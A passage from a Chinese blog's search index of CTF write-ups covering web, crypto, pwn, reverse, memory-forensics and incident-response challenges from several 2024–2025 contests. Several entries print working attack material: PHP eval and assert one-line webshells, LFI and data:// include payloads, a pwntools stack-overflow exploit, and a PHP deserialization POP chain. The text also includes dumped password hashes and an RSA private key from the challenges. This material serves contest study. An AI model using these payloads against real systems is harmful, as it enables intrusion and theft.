serialize($sdu);\nPD89YGNhdCAvZipgOw==可以绕过过滤，实则他就是\n&lt;?=`cat /f*`;\n最终会把flag导出到网站目录的aaaa.php中直接访问可以拿到flag即flag&#123;f44ab7d7195a1f156aa2fbc1ceba61ec&#125;\n第3天 easy_php打开之后可以直接下载源码，源码中的file.php中内容如下\n&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);include &#x27;function.php&#x27;;include &#x27;class.php&#x27;;#ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/phar2&#x27;);$file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;;if(empty($file)) &#123;    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;;&#125;$show = new Show();if(file_exists($file)) &#123;    $show-&gt;source = $file;    $show-&gt;_show();&#125; else if (!empty($file))&#123;    die(&#x27;file doesn\\&#x27;t exists.&#x27;);&#125;?&gt;\n在SHOW()这个类中，内容如下\nclass Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123;            die(&#x27;hacker!&#x27;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;    &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;\n当设置好source之后去_show的时候/http|https|file:|gopher|dict|\\.\\.|f1ag/i只要不是这些就会直接显示，即构造payload为GET/file.php?file=/flag即拿到flagflag&#123;a16dcb7549915546893a27a6d7927615&#125;\n第3天 easy_code这道题也是后续整理的，网站中有个robots.txt访问后会发现有个gogogo.php，访问之后主要是这里，并且题目也提示了需要溢出，之后通过filter去读取read.php\nif ($ctfer === null) &#123;    die(&quot;error 0!&quot;);&#125;if (!is_numeric($ctfer)) &#123;    die(&quot;error 1!&quot;);&#125;if ($ctfer!= 667) &#123;    die(&quot;error 2!&quot;);&#125;//溢出if (strpos(strval($ctfer), &#x27;7&#x27;)!== false) &#123;    die(&quot;error 3!&quot;);&#125;\n最终构造的payload是\nctfer=6.66999999999999999999999999999999999999999e2file=php://filter/convert.iconv.utf-8.utf-16le/resource=read.php\nCrypto第1天 通往哈希的旅程在数字城，大家都是通过是通过数字电话进行的通信,常见是以188开头的11位纯血号码组成，亚历山大抵在一个特殊的地方截获一串特殊的字符串”ca12fd8250972ec363a16593356abb1f3cf3a16d”，通过查阅发现这个跟以前散落的国度有点相似，可能是去往哈希国度的。年轻程序员亚力山大抵对这个国度充满好奇，决定破译这个哈希值。在经过一段时间的摸索后，亚力山大抵凭借强大的编程实力成功破解，在输入对应字符串后瞬间被传送到一个奇幻的数据世界，同时亚力山大抵也开始了他的进修之路。(提交格式：flag{11位号码}）题目主要是想让写脚本爆破，我尝试爆破一直没出，估计是脚本写错了，就直接去cmd5这种网站直接梭了。密文是ca12fd8250972ec363a16593356abb1f3cf3a16d取前18个去https://www.somd5.com/中解直接出flag,拿全部的去cmd5也能解出flag{18876011645}\n第3天 funny_rsa参考脚本\nimport gmpy2from Crypto.Util.number import *funny1 = (    -17696257697673533517695215344482784803953262308315416688683426036407670627060768442028628137969719289734388098357659521255966031131390425549974547376165392147394271974280020234101031837837842620775164967619688351222631803585213762205793801828461058523503457022704948803795360591719481537859524689187847958423587638744086265395438163720708785636319741908901866136858161996560525252461619641697255819255661269266471689541673348377717503957328827459396677344554172542244540931545166846117626585580964318010181586516365891413041095399344533013057011854734701706641516027767197631044458866554524544179750101814734153116374)funny2 = 23686728880494758233026798487859622755203105120130180108222733038275788082047755828771429849079142070779731875136837978862880500205129022165600511611807590195341629179443057553694284913974985006590617143873019530710952420242412437467917519539591683898715990297750494900923245055632544763410401540518654522017115269508183482044872091052235608170710105631742176900306097734799793264202179181242015892763311753674799273300604804820015447161950996038795518844564861004398396796284113803759208011funny3 = 419166458284161364374927086939132546372091965414091344286510440034452974193054721041229068769658972346759176374539266235862042787888391905466876330331208651698002159575012622762558316612596034044109738533275009086940744966244759977014078484433213617582101347769476703012517531619023366639507114909172774156647998737369356116119513795863130218094614475699956104117183821832339358478426978211282822163928764161915824622224165694904342224081321345691796882691318330781141960650263488927837990954860719950761728580780956673732592771855694502630374907978111094148614378212006604233062606116168868545120407836000858982789824582335703891535021579560434875457656655941164757860852341484554015214879991896412137447010444797452119431147303295803678311972500421396900616845556636124424993090559354406417222700637726789045926994792374756038517484548544506630672251868349748176389591615802039026216656891403871728516658502023897343287181822303758976641229952646993446276281728919020747050486979968215989594984778920359425264076558022228448529089047021814759587052098774273578311709416672952218680244714492318709603579024funny4 = 13541898381047120826573743874105965191304100799517820464813250201030319771155430755606644860103469823030581858410957600027665504533335597988508084284252510961847999525811558651340906333101248760970154440885012717108131962658921396549020943832983712611749095468180648011521808106480590665594160479324931351996812185581193608244652792936715504284312172734662364676167010674359243219959129435127950232321130725013160026977752389409620674167037650367196748592335698164875097139931376389630867192761783936757260359606379088577977154378217235326249540098268616890307702288393952949444753648206049856544634755301197410481479n = (funny3 + 1025) // gmpy2.gcd(funny3 + 1025, funny2)p_add_q = funny1 + n  p = 146244963903123897384722629319865983862385290427491632619680838698915634884136798118860944346342346684665267628932533730684360351083477628483048417394493368921029652616722076101582581881994784549216229374327065827698990452634615021972143959360660773895031574424678151072027651307994605157369826310532546455301q = n // pphi = (p - 1) * (q - 1)d = gmpy2.invert(65537, phi)hint = pow(funny4, d, n)flag = long_to_bytes(funny2 // hint)print(flag)print(    long_to_bytes(        5044833682931814367881036090727702841234957943094051805420875375031047763007750978962055801191968383860156687597666360268370292861    ))\n其中p 是题目中给定的一个质数，用来构造 RSA 的模数 n，而5044833682931814367881036090727702841234957943094051805420875375031047763007750978962055801191968383860156687597666360268370292861开头的数字是通过私钥解密 funny4 得到的密文结果。\n","categories":["CTF相关","WriteUp"],"tags":["CTF","WriteUp","WEB","CRYPTO","MISC"]},{"title":"2024第一届Solar杯应急响应挑战赛-WriteUp","url":"/2024/12/28/2024%E7%AC%AC%E4%B8%80%E5%B1%8ASolar%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/","content":"前言CTF是数据库4-5、逆向破解-1、综合应急-2未解出，然后理论是Windows的应急响应,就拿到了300,这个成绩和排名真的是非常的可惜。最终成绩是49名拿到了一个优秀奖。\n签到本题作为签到题,请给出邮服发件顺序。  \nReceived: from mail.da4s8gag.com ([140.143.207.229])  by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD  for ; Thu, 17 Oct 2024 11:24:01 +0800  X-QQ-mid: xmmxszc6-1t1729135441tm9qrjq3k  X-QQ-XMRINFO: NgToQqU5s31XQ+vYT/V7+uk=  Authentication-Results: mx.qq.com; spf=none smtp.mailfrom=;  dkim=none; dmarc=none(permerror) header.from=solar.sec  Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1])  by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264  for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST)  Date: Thu, 17 Oct 2024 11:24:01 +0800  To: hellosolartest@qq.com  From: 鍏嬪競缃戜俊  Subject:xxxxxxxxxx  Message-Id: &lt;20241017112401.032146@mail.solar.sec&gt;  X-Mailer: QQMail 2.x\n把邮箱地址挨个拿出来即可flag{mail.solar.sec|mail.da4s8gag.com|newxmmxszc6-1.qq.com}\n日志流量-1题目文件：tomcat-wireshark.zip&#x2F;web新手运维小王的Geoserver遭到了攻击：黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。flag格式 flag{xxxx}流量分析中发现b.jsp的流量最大，而且都是加密内容，这里直接反编译一下发现flag，反编译这里需要反编译的路径是在apache-tomcat-9.0.96\\work\\Catalina\\localhost\\ROOT\\org\\apache\\jsp,根目录给的那俩是不能用的。\n日志流量-2题目文件：tomcat-wireshark.zip&#x2F;web新手运维小王的Geoserver遭到了攻击：小王拿到了当时被入侵时的流量，其中一个IP有访问webshell的流量，已提取部分放在了两个pcapng中了。请帮他解密该流量。flag格式 flag{xxxx}这段代码很清晰，是AES的加密，没指定加密模式应该是ECB,然后key是a2550eeab0724a69\nString code=&quot;ZiFsXmEqZ3tBN2I0X1g5ektfMnY4Tl93TDVxNH0=&quot;; String xc=&quot;a2550eeab0724a69&quot;; class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125;\n挨个分析到流6他执行的对应命令是拿到的返回内容是\n日志流量-3题目文件：tomcat-wireshark.zip&#x2F;web新手运维小王的Geoserver遭到了攻击：小王拿到了当时被入侵时的流量，黑客疑似通过webshell上传了文件，请看看里面是什么。flag格式 flag{xxxx}分析完2紧接着有个很大的流量，解密发现他上传了一个pdf，我这里直接保存pdf然后改后缀打开拿到flag\n内存取证-1题目文件：SERVER-2008-20241220-162057请找到rdp连接的跳板地址flag格式 flag{1.1.1.1}RDP是远程桌面，端口一般都是3389，直接分析网络即可。\nE:\\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile Win7SP1x64 netscan |findstr 3389Volatility Foundation Volatility Framework 2.60x7e300dc0         TCPv4    0.0.0.0:3389                   0.0.0.0:0            LISTENING        1908     svchost.exe0x7e303360         TCPv4    0.0.0.0:3389                   0.0.0.0:0            LISTENING        1908     svchost.exe0x7e303360         TCPv6    :::3389                        :::0                 LISTENING        1908     svchost.exe0x7decc010         TCPv4    192.168.60.150:3389            192.168.60.220:34121 ESTABLISHED      1908     svchost.exe\nflag{192.168.60.220}\n内存取证-2题目文件：SERVER-2008-20241220-162057请找到攻击者下载黑客工具的IP地址flag格式 flag{1.1.1.1}我是通过网络的形式，通过下面命令拿到下面可疑信息\nE:\\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 netscan...0x7de65cf0         TCPv4    -:49263                        155.94.204.67:85     CLOSED           5040x7de89540         TCPv4    192.168.60.150:445             192.168.60.169:46087 CLOSED           4        System0x7dec4480         TCPv4    192.168.60.150:49261           34.117.188.166:443   ESTABLISHED      2068     firefox.exe0x7decc010         TCPv4    192.168.60.150:3389            192.168.60.220:34121 ESTABLISHED      1908     svchost.exe0x7ded2ba0         TCPv4    192.168.60.150:49185           34.107.243.93:443    ESTABLISHED      2068     firefox.exe0x7df56cf0         TCPv4    192.168.60.150:49257           192.168.60.169:4444  ESTABLISHED      828      spoolsv.exe0x7e6ef400         TCPv4    -:0                            168.148.77.26:0      CLOSED           48       N\n我去查询第一个的时候发现他是一个每过的ip，直接尝试提交，拿到flagflag{155.94.204.67}\n内存取证-3题目文件：SERVER-2008-20241220-162057攻击者获取的“FusionManager节点操作系统帐户（业务帐户）”的密码是什么flag格式 flag{xxxx}在这里发现一个pass.txt，判断大概率在这里。这里直接导出\nE:\\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan |findstr pass.txtVolatility Foundation Volatility Framework 2.60x000000007e4cedd0     16      0 R--rw- \\Device\\HarddiskVolume2\\Users\\Administrator\\Desktop\\pass.txt0x000000007e4ec900      2      0 RW-rw- \\Device\\HarddiskVolume2\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\pass.txt.lnkE:\\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4cedd0 -D ./Volatility Foundation Volatility Framework 2.6DataSectionObject 0x7e4cedd0   None   \\Device\\HarddiskVolume2\\Users\\Administrator\\Desktop\\pass.txt\n\nflag{GalaxManager_2012}\n内存取证-4题目文件：SERVER-2008-20241220-162057请找到攻击者创建的用户flag格式 flag{xxxx}直接列出所有用户，我尝试Testuser发现错误，Administrator和Guest是系统自带的，ASP.NET似乎是微软的一个后端框架，尝试这个成功。\nE:\\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile Win7SP1x64  printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot;Volatility Foundation Volatility Framework 2.6Legend: (S) = Stable   (V) = Volatile----------------------------Registry: \\SystemRoot\\System32\\Config\\SAMKey name: Names (S)Last updated: 2024-12-20 16:14:42 UTC+0000Subkeys:  (S) Administrator  (S) ASP.NET  (S) Guest  (S) TestuserValues:REG_DWORD                     : (S) 0\n内存取证-5题目文件：SERVER-2008-20241220-162057请找到攻击者利用跳板rdp登录的时间flag格式 flag{2024&#x2F;01&#x2F;01 00:00:00}\nE:\\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile Win7SP1x64 pslist|findstr rdpVolatility Foundation Volatility Framework 2.60xfffffa801b046b30 rdpclip.exe            3896   1908      8      153      2      0 2024-12-20 16:15:34 UTC+0000E:\\TEMP&gt;\n一直提交这个一直错误，一想他是UTC，尝试提交国内时区的即可成功flag&#123;2024/12/21 00:15:34&#125;\n内存取证-6题目文件：SERVER-2008-20241220-162057请找到攻击者创建的用户的密码哈希值flag格式 flag{XXXX}根据取证4直接看hash\nE:\\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile Win7SP1x64  printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot;Volatility Foundation Volatility Framework 2.6Legend: (S) = Stable   (V) = Volatile----------------------------Registry: \\SystemRoot\\System32\\Config\\SAMKey name: Names (S)Last updated: 2024-12-20 16:14:42 UTC+0000Subkeys:  (S) Administrator  (S) ASP.NET  (S) Guest  (S) TestuserValues:REG_DWORD                     : (S) 0E:\\TEMP&gt;volatility -f SERVER-2008-20241220-162057.raw --profile Win7SP1x64  hashdumpVolatility Foundation Volatility Framework 2.6Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Testuser:1000:aad3b435b51404eeaad3b435b51404ee:4bdcecfc666b002ea5aab1df8f08a9a2:::ASP.NET:1001:aad3b435b51404eeaad3b435b51404ee:5ffe97489cbec1e08d0c6339ec39416d:::\nflag{5ffe97489cbec1e08d0c6339ec39416d}\n数据库-1题目附件：mssql、mssql题-备份数据库请找到攻击者创建隐藏账户的时间flag格式 如 flag{2024&#x2F;01&#x2F;01 00:00:00}虚机没提供密码，可以参考这篇文章来直接进入虚机通过动态取证的方式，进入虚拟机，在登陆的时候发现有个test$用户可以选择，一看就是个后门用户，这里通过命令拿到flagflag{2024&#x2F;12&#x2F;16 15:24:21}\n数据库-2题目附件：mssql、mssql题-备份数据库请找到恶意文件的名称flag格式 如 flag{.}一眼矿flag{xmrig.exe}\n数据库-3题目附件：mssql、mssql题-备份数据库请找到恶意文件的外联地址flag格式 如 flag{1.1.1.1}火绒剑直接梭flag{203.107.45.167}\n","categories":["CTF相关","WriteUp"],"tags":["CTF","WriteUp","WEB","CRYPTO","Forensics"]},{"title":"2025第一届“启航杯”网络安全挑战赛-WriteUp","url":"/2025/01/26/2025%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/","content":"解题情况最终排名19，22道题目，20解，一道社工的你猜猜这是哪和取证的Win_06没解出来，题目质量并不高。其中逆向、密码均为wheeler大佬提供的wp，猿类的语言的wp为beginner大佬提供。\nMISCQHCTF For Year 2025根据提示画图080714212829302316092230-04111825121306132027-0605041118252627-08091009162330-0102031516170108152229-0108142229-0203041617180209162330-0108152229303124171003-231609021725181104-01020917233029FLAG为QHCTF&#123;FUN&#125;\n______启动！挨个查看了一下流量，基本上都是加密的，最有线索的是流135，很像是webshell的流量，但是最终返回的是403，自己解密拿不到内容感觉像是冰蝎的流量，通过PuzzleSolver解密出下面内容，他是冰蝎4的流量通过豆包解密flag为QHCTF&#123;69b62b46-de2f-4ac2-81f7-234613d25cfb&#125;\n你能看懂这串未知的文字吗翻了好多，找到一个差不多的，羊文解密拿到内容szfpguwizgwesqzoaoerv,直接提交是失败的，继续从图片中找内容，发现有一个lsb隐写拿到lsb的字符串qihangbeiiseasy，之后使用维吉尼亚密码尝试解密拿到flagcryptoveryeasybysheep,在羊文图中后面有三个!,加上即可flag为QHCTF&#123;cryptoveryeasybysheep!!!&#125;\n请找出拍摄地所在位置图片内如如下根据可用信息绿源、雅迪、洋丰复合肥、柳化复合肥去地图中挨个找。找到下面地址https://j.map.baidu.com/74/OpSiflag为QHCTF&#123;广西壮族自治区柳州市柳城县榕泉路与六广路交叉口&#125;\nPvzHE纸老虎，直接按日期排序，最早的图片中就有flag\n猿类的编程语言你了解吗用工具jphs出了，原来的其他隐写工具没出来seek后出来一个okk码\n.. .. .. .. .. .. .. .. .. .. !? .? .. .? .. .. .. .? .. .. .. .. .. .. .. .? .. .. .. .. .. .. .. .. .. .. ?. ?. ?. ?. !! ?! .? .? .? .. .. .. .. .. .. .. .. .. .. .. !. !! !! !! !! !! !! !! !! !! !. !! !! !! !! !! !. .? !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !. ?. .. .. .. !. .? .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. !. ?. ?. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. !. .? .? !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !. ?. ?. .. .. .. !. !. .? .? !. ?. ?. !! !! !! !! !! !. .? .? .. !. ?. ?. .. .. .. .. !. !! !! !! !! !! !! !! !. .? .? !! !! !! !! !. ?. ?. .. .. .. .. .. .. .. .. !. .? .? !. ?. ?. .. .. .. .. !. !! !! !! !! !! !! !! !! !! !! !! !! !. .. .. .. .. .. .. .. !. !! !! !! !! !. .? .? .. .. .. .. !. !! !! !! !! !. ?. ?. !! !! !! !. .. .. .. .. .. .. .. .. .. .. .. !. !! !! !! !! !! !! !! !! !. .? .? .. .. .. .. .. !. ?. ?. .. .. .. .. !. !! !! !! !! !! !! !! !. .? .? !! !! !! !! !. .. !. ?. ?. .. .. .. .. .. .. !. .. .. .. !. !! !! !! !! !! !! !. .. .. .. !. .? .? !! !! !. ?. ?. !! !! !! !. .? .? .. .. .. .. !. !! !! !! !! !. ?. ?. .. .. .. !. .. .. .. .. .. .. !. .? .? .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. !.\n解密拿到flag\n你猜猜我在哪赛后公布的flagQHCTF&#123;湖南省郴州市汝城县滨河大道与神农大道交叉路口&#125;\nCryptoEasy_RSARSA签到题难度，给了公钥与私钥，直接解即可\n# -*- coding: utf-8 -*-from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPimport base64key = RSA.generate(1024)private_key = key.export_key()public_key = key.publickey().export_key()print(&quot;私钥:&quot;)print(private_key)print(&quot;公钥:&quot;)print(public_key)def encrypt_message(message, public_key):    key = RSA.import_key(public_key)    cipher = PKCS1_OAEP.new(key)    encrypted_message = cipher.encrypt(message.encode())    return base64.b64encode(encrypted_message).decode()message = &quot;Hello, this is a secret message!&quot;encrypted = encrypt_message(message, public_key)print(&quot;加密后的消息:&quot;)print(encrypted)private_key = b&#x27;-----BEGIN RSA PRIVATE KEY-----\\nMIICXQIBAAKBgQDDe2nPHYHbOm8UeieE0c2Dd8Avd7XEk3+Gi81rDkaRfbj9bNsP\\n4TzkaY8VLTLuk36W6FQOowkfekbWxIx0jxNrhN2K+F5o4HQvyVDY/t14HYrWFR3c\\nYo8abbrHc4RlEnxvyKlS8hlw1sPwXYvicVYE27Vdq3J7Y4VVZ8tWtBLuaQIDAQAB\\nAoGAI5BJUK/qlwrLeKs8k1JkFD3uDfS2cfvvoHfAuHBRcFiyFhD+zaXJoTh/Gngt\\nou/cgPHlkQAiQcLKLnp1nyMEgiK1NNwAtroS8lm1K4AZ3ltIKgqq4cnQSuFDDXZB\\nw96P+DCkjI1hSRE+/TZ7cN9SllCVj6tS1Y7V76sMPNEoH80CQQDfBqSkGPWZm9zQ\\nNVnrIizeEhz/aa7LJeYxirmkQy2X7Hs0vB2Y30a7ICU4LwnT+9ugFLM2mmpgrjLh\\nVKN/uHL7AkEA4GJBqavJktwYCtTUnLWYIfsGMO5KZAdjZS1wvea2miZYJc6Qn61p\\najON4PaSWEUQEKqk+9fwrsU3lrglmBaG6wJAE8IU5+zGJVunjlKLqscWTn4wT3hf\\nYePzpsPxelnxOhpbN+rKfHabX4yTf4y7RCp15JKw5c98SSBlpYzIB1Kh7QJBANwW\\nREXCZFMSYtqs62ZSkEg0SlxQPtNik9G4Am+iDtWgarGarSySEWXD75QLBnxiMWHH\\nn1AO/NrQQrgpI2bMIcUCQQCI5JQzp8FmyjjOsrJiwT0NWiTdko6qMCZ4LEFMY0s8\\nGylIRw11S0K+dU0LI4Xs92AxuA1BPN25KMGmwvxtWmPR\\n-----END RSA PRIVATE KEY-----&#x27;public_key = b&#x27;-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDe2nPHYHbOm8UeieE0c2Dd8Av\\nd7XEk3+Gi81rDkaRfbj9bNsP4TzkaY8VLTLuk36W6FQOowkfekbWxIx0jxNrhN2K\\n+F5o4HQvyVDY/t14HYrWFR3cYo8abbrHc4RlEnxvyKlS8hlw1sPwXYvicVYE27Vd\\nq3J7Y4VVZ8tWtBLuaQIDAQAB\\n-----END PUBLIC KEY-----&#x27;cip = b&quot;v1XpEQbLRdiqwgZXbn0xBNQ7kjCD3MgwbJa+ZQUmpPz++ZFw3FGjUKL140Rqceukiwq44xGy3ZqRfPZHRg7KISN/544dWq4rHcOx4I087oTYrHVjESsBJMxnpSuBNB6jEQVcPRapDlitHsNdkphIr24cwstzLzwcf1ORpWYDugg=&quot;def decrypt_message(encrypted_message, pri_key):    message = base64.b64decode(encrypted_message)    key = RSA.import_key(pri_key)    cipher = PKCS1_OAEP.new(key)    ming = cipher.decrypt(message)    return mingm = decrypt_message(cip,private_key)print(m)\n\nPWNEasy_pwn经典栈溢出\nfrom pwn import *context.log_level = &quot;debug&quot;# sh = process(&quot;./pwn1&quot;)sh = remote(&quot;154.64.245.108&quot;,33275)ret = 0x0000000000401016back_door = 0x0000000004011C6payload = b&quot;a&quot;*0x58  + p64(ret) + p64(back_door)sh.sendlineafter(b&quot;Welcome to QHCTF 2025!\\n&quot;,payload)sh.interactive()\n\nReverseChecker就一异或\ncip = bytes.fromhex(&quot;726B607765584646154014411A400E461445160E174542410E1A4147450E4642131446131017451542165E&quot;)cip = bytearray(cip)for i in range(len(cip)):    cip[i] ^= 0x23print(bytes(cip))\n\nrainbow就一异或 x2\ncip = bytearray(bytes.fromhex(&quot;0B12190E1C213B6268686C6B6A69776F3B633B776E3C3B6D773B38393C773E3F3B6E69623B6D393F6D6227&quot;))for i in range(len(cip)):    cip[i] ^= 90print(bytes(cip))\nnote去下载最新版 upx来对note进行脱壳https://github.com/upx/upx/releases/tag/v4.2.4brva 0x0000000000012A8 下断点，即可看到flag\nWEBEasy_include&lt;?phperror_reporting(0);//flag in flag.php$file=$_GET[&#x27;file&#x27;];if(isset($file))&#123;    if(!preg_match(&quot;/flag/i&quot;,$file))    &#123;        include($file);    &#125;    else    &#123;        echo(&quot;no no no ~ &quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n通过payload?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbYV0pOyA/Pg==构造一个一句话木马，直接通过蚁剑连接即可，因为是动态flag这里不多写了。\nPCREMagic&lt;?phpfunction is_php($data)&#123;     return preg_match(&#x27;/&lt;\\?php.*?eval.*?\\(.*?\\).*?\\?&gt;/is&#x27;, $data);&#125;if(empty($_FILES)) &#123;    die(show_source(__FILE__));&#125;$user_dir = &#x27;data/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);$data = file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);if (is_php($data)) &#123;    echo &quot;bad request&quot;;&#125; else &#123;    if (!is_dir($user_dir)) &#123;        mkdir($user_dir, 0755, true);    &#125;    $path = $user_dir . &#x27;/&#x27; . random_int(0, 10) . &#x27;.php&#x27;;    move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $path);    header(&quot;Location: $path&quot;, true, 303);    exit;&#125;?&gt; 1\n手写一个提交文件的网页\n&lt;form  action=&quot;http://challenge.qihangcup.cn:35056/&quot;  method=&quot;POST&quot;  enctype=&quot;multipart/form-data&quot;&gt;  &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;  &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt;&lt;/form&gt;\naction写自己的靶机地址,之后上传一句话木马\n&lt;?php assert($_POST[&#x27;shell&#x27;]); ?&gt;\n自己可以构造一个phpinfo查看禁用的函数，这里只能通过assert伪造编码器记得勾选base64,不然都是不能用的，必须用编码绕过。\nWeb_IPphp的SSIT,直接构造一个查看flag的\nWeb_pop&lt;?phperror_reporting(0);highlight_file(__FILE__);class Start&#123;    public $name;    protected $func;     public function __destruct()    &#123;        echo &quot;Welcome to QHCTF 2025, &quot;.$this-&gt;name;    &#125;     public function __isset($var)    &#123;        ($this-&gt;func)();    &#125;&#125; class Sec&#123;    private $obj;    private $var;     public function __toString()    &#123;        $this-&gt;obj-&gt;check($this-&gt;var);        return &quot;CTFers&quot;;    &#125;     public function __invoke()    &#123;        echo file_get_contents(&#x27;/flag&#x27;);    &#125;&#125; class Easy&#123;    public $cla;     public function __call($fun, $var)    &#123;        $this-&gt;cla = clone $var[0];    &#125;&#125; class eeee&#123;    public $obj;     public function __clone()    &#123;        if(isset($this-&gt;obj-&gt;cmd))&#123;            echo &quot;success&quot;;        &#125;    &#125;&#125; if(isset($_POST[&#x27;pop&#x27;]))&#123;    unserialize($_POST[&#x27;pop&#x27;]);&#125;\n构造代码如下\n&lt;?php// error_reporting(0);// highlight_file(__FILE__);class Start&#123;    public $name;    public $func;    // protected $func;    // public function __destruct()    // &#123;    //     echo &quot;Welcome to QHCTF 2025, &quot; . $this-&gt;name;    // &#125;    // public function __isset($var)    // &#123;    //     ($this-&gt;func)();    // &#125;&#125;class Sec&#123;    // private $obj;    // private $var;    public $obj;    public $var;    // public function __toString()    // &#123;    //     $this-&gt;obj-&gt;check($this-&gt;var);    //     return &quot;CTFers&quot;;    // &#125;    // public function __invoke()    // &#123;    //     echo file_get_contents(&#x27;/flag&#x27;);    // &#125;&#125;class Easy&#123;    public $cla;    // public function __call($fun, $var)    // &#123;    //     $this-&gt;cla = clone $var[0];    // &#125;&#125;class eeee&#123;    public $obj;    // public function __clone()    // &#123;    //     if (isset($this-&gt;obj-&gt;cmd)) &#123;    //         // echo &quot;success&quot;;    //     &#125;    // &#125;&#125;$f = new Sec();$e = new Start();$d = new eeee();$c = new Easy();$b = new Sec();$a = new Start();$e-&gt;func = $f;$d-&gt;obj = $e;$c-&gt;cla = $d;$b-&gt;var = $d;$b-&gt;obj = $c;$a-&gt;name = $b;echo serialize($a);\n即O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;N;s:4:&quot;func&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;N;s:3:&quot;var&quot;;N;&#125;&#125;&#125;&#125;s:3:&quot;var&quot;;r:4;&#125;s:4:&quot;func&quot;;N;&#125;\nForensics关于动态取证流程是e01-&gt;FTK 